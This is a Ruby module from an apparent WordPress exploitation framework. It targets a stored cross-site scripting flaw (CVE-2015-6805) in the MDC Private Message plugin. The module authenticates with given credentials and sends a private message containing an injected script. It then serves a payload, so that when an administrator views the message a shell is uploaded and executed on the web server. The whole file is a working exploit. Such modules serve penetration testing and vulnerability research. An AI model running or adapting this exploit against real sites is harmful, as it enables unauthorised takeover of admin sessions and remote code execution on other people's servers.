# frozen_string_literal: true

class Wpxf::Exploit::MdcPrivateMessageXssShellUpload < Wpxf::Module
  include Wpxf
  include Wpxf::WordPress::Login
  include Wpxf::WordPress::Plugin
  include Wpxf::WordPress::Xss

  def initialize
    super

    update_info(
      name: 'MDC Private Message XSS Shell Upload',
      desc: 'This module exploits a lack of validation in versions '\
            '<= 1.0.0 of the MDC Private Message plugin which '\
            'allows authenticated users of any level to send messages '\
            'containing a script which allows this module to upload and '\
            'execute the payload in the context of the web server once an '\
            'admin reads the message containing the stored script.',
      author: [
        'Chris Kellum', # Vulnerability discovery
        'rastating'     # WPXF module
      ],
      references: [
        ['CVE', '2015-6805'],
        ['WPVDB', '8154'],
        ['EDB', '37907']
      ],
      date: 'Aug 20 2015'
    )

    register_options([
      StringOption.new(
        name: 'username',
        desc: 'The WordPress username to authenticate with',
        required: true
      ),
      StringOption.new(
        name: 'password',
        desc: 'The WordPress password to authenticate with',
        required: true
      ),
      IntegerOption.new(
        name: 'user_id',
        desc: 'The user ID of the user to send the message to',
        default: 1,
        required: true
      ),
      StringOption.new(
        name: 'msg_subject',
        desc: 'The subject of the message that will be sent to the admin',
        required: true,
        default: Utility::Text.rand_alphanumeric(rand(5..20))
      ),
      StringOption.new(
        name: 'msg_body',
        desc: 'The text portion of the message that will be visible to the recipient',
        required: true,
        default: Utility::Text.rand_alphanumeric(rand(10..50))
      ),
    ])
  end

  def check
    check_plugin_version_from_readme('mdc-private-message', '1.0.0.1')
  end

  def user_id
    normalized_option_value('user_id')
  end

  def msg_subject
    datastore['msg_subject']
  end

  def msg_body
    datastore['msg_body']
  end

  def run
    return false unless super

    cookie = authenticate_with_wordpress(datastore['username'], datastore['password'])
    return false unless cookie

    # Success will be determined in another procedure, so initialize to false.
    @success = false

    emit_info 'Storing script...'
    emit_info xss_include_script, true
    res = execute_post_request(
      url: wordpress_url_admin_ajax,
      cookie: cookie,
      body: {
        'action'  => 'mdc_send_msg',
        'from'    =>  user_id.to_s,
        'to'      =>  user_id.to_s,
        'subject' => msg_subject,
        'message' => "#{msg_body}<script>#{xss_include_script}</script>"
      }
    )

    if res.nil?
      emit_error 'No response from the target'
      return false
    end

    if res.code != 200
      emit_error "Server responded with code #{res.code}"
      return false
    end

    emit_success "Script stored and will be executed when the user views the message"
    start_http_server

    return @success
  end
end
